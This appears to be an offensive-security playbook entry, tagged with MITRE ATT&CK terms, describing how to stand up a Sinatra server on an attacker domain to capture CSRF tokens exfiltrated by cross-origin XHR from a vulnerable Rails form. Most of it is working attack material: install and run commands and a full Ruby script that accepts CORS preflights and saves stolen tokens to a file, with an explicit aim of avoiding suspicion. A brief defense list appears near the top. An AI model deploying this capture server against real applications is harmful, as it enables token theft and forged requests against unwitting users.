---
tags:
  - cors
  - sinatra
  - token-capture
type: procedure
tools:
  - '[[tools/Sinatra]]'
tactics:
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:03.507Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 0f562f45-96f5-46c2-8f59-5d590a3bb4b8
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Set-Up-External-Server-with-Sinatra-for-Token-Capture

## Summary

This procedure sets up a lightweight Sinatra server to receive CORS-enabled XHR POST requests from the vulnerable Rails form, capturing the X-CSRF-Token header for later use in forging requests.

## Description

The server must handle OPTIONS preflight requests to satisfy CORS requirements, allowing the browser to send the custom X-CSRF-Token header. Upon receiving the POST, it logs or stores the token. This is essential for the attack as browsers block cross-origin requests without proper CORS headers. The setup assumes a public attacker domain and focuses on simplicity for token exfiltration.

## Requirements

1. Ruby and Sinatra gem installed on attacker machine
2. Publicly accessible domain (e.g., attacker.com) with port forwarding if needed
3. Basic Ruby knowledge for server configuration

## Defense

Defensive measures and detection strategies:

- Block or monitor external domains serving CORS headers for custom auth headers
- Use network monitoring to detect anomalous outbound XHR from web apps
- Implement strict CORS policies on legitimate apps

## Objectives

1. Enable CORS for POST requests with x-csrf-token header
2. Capture and log the incoming CSRF token
3. Respond minimally to avoid suspicion

## Instructions

### Step 1: Install Sinatra

**Context**: Ensure Sinatra is available; install if needed.

```bash
gem install sinatra
```

> Installs the Sinatra framework for Ruby web apps.

### Step 2: Create Server Script

**Context**: Write a Ruby file with routes for OPTIONS and POST to handle CORS and capture.

Create app.rb:

```ruby
require 'sinatra'

options '/*' do
  headers['Access-Control-Allow-Origin'] = '*'
  headers['Access-Control-Allow-Methods'] = 'POST'
  headers['Access-Control-Allow-Headers'] = 'x-csrf-token'
  200
end

post '/*' do
  token = request.env['HTTP_X_CSRF_TOKEN']
  File.open('captured_token.txt', 'w') { |f| f.write(token) }  # Store token
  puts "Captured: #{token}"
  'foo'
end
```

### Step 3: Run the Server

**Context**: Start the server on the attacker domain.

```bash
ruby app.rb
```

> Server runs on http://localhost:4567; use ngrok or DNS for public access.

**Expected Output**: Server output: "== Sinatra (vX.X.X) has taken the stage..."

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Sinatra]]

## Tags

- [[cors]]
- [[tools/Sinatra]]
- [[token-capture]]
